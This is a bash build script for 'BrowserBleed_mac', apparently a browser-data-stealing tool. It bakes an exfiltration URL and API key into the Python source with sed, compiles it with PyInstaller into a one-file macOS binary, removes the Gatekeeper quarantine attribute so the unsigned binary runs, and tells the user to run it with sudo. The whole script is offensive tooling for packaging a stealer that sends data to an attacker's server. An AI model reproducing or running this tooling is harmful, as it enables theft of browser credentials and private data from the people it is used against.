#!/usr/bin/env bash
# Build BrowserBleed_mac as a standalone binary with the report server baked in.
# Run on macOS with Python 3.10+ and the cryptography + pyinstaller packages installed:
#   pip3 install cryptography pyinstaller
#   chmod +x build_mac.sh && ./build_mac.sh
#
# Override URL/key:
#   EXFIL_URL=https://... EXFIL_KEY=mykey ./build_mac.sh

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BUILD_TMP="$(mktemp -d)"

# ── Load deploy/config if env vars not set ────────────────────────────────────
CONFIG="$SCRIPT_DIR/deploy/config"
if [ -f "$CONFIG" ]; then
    DOMAIN_VAL=$(grep '^DOMAIN=' "$CONFIG" | cut -d= -f2-)
    KEY_VAL=$(grep '^BB_API_KEY=' "$CONFIG" | cut -d= -f2-)
    EXFIL_URL="${EXFIL_URL:-https://$DOMAIN_VAL}"
    EXFIL_KEY="${EXFIL_KEY:-$KEY_VAL}"
fi

EXFIL_URL="${EXFIL_URL:-}"
EXFIL_KEY="${EXFIL_KEY:-}"

if [ -z "$EXFIL_URL" ] || [ -z "$EXFIL_KEY" ]; then
    echo "[!] EXFIL_URL or EXFIL_KEY not set — add DOMAIN and BB_API_KEY to deploy/config"
    exit 1
fi

echo "[*] Building BrowserBleed_mac"
echo "    Exfil URL: $EXFIL_URL"
echo "    Exfil key: ${EXFIL_KEY:0:4}****"

# ── Patch a temp copy of the source ──────────────────────────────────────────
TMP_SRC="$BUILD_TMP/BrowserBleed_mac.py"
sed \
    -e "s|_EXFIL_URL: str = \"\"|_EXFIL_URL: str = \"$EXFIL_URL\"|" \
    -e "s|_EXFIL_KEY: str = \"\"|_EXFIL_KEY: str = \"$EXFIL_KEY\"|" \
    "$SCRIPT_DIR/BrowserBleed_mac.py" > "$TMP_SRC"

# ── Build ─────────────────────────────────────────────────────────────────────
echo "[*] Building BrowserBleed_mac..."
python3 -m PyInstaller \
    --onefile \
    --name BrowserBleed_mac \
    --distpath "$SCRIPT_DIR" \
    --workpath "$BUILD_TMP" \
    --specpath "$BUILD_TMP" \
    "$TMP_SRC"

rm -rf "$BUILD_TMP"

# Strip Gatekeeper quarantine so the binary runs without a signed identity.
# Required on macOS 12+ for unsigned local builds.
echo "[*] Stripping quarantine attribute..."
xattr -dr com.apple.quarantine "$SCRIPT_DIR/BrowserBleed_mac" 2>/dev/null || true

echo "[+] Done: $SCRIPT_DIR/BrowserBleed_mac"
echo "    Run with: sudo ./BrowserBleed_mac"
